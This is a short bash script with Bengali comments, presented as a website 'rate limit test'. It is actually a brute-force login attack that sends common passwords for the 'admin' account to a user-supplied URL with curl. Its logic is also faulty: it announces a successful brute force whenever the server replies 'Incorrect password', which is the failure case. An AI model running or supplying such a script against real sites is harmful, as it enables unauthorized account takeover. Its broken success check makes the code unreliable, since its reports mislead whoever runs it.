#!/bin/bash

# ওয়েবসাইট URL ইনপুট নিন
echo "Enter Website URL for Rate Limit Test (e.g., http://example.com/login):"
read URL

# অনেক পাসওয়ার্ড ট্রাই করা
PASSWORDS=("password123" "123456" "qwerty" "admin")

for PASS in "${PASSWORDS[@]}"
do
    # ব্রুট ফোর্স প্রয়োগ করা
    RESPONSE=$(curl -s -d "username=admin&password=$PASS" $URL)

    # যদি সাইট রেট লিমিটিং হ্যান্ডেল না করে, তাহলে পাসওয়ার্ড ট্রাই করা যাবে
    if echo $RESPONSE | grep -q "Incorrect password"; then
        echo "[+] Brute force successful with password: $PASS"
    else
        echo "[-] Rate limiting detected or account locked."
        break
    fi
done
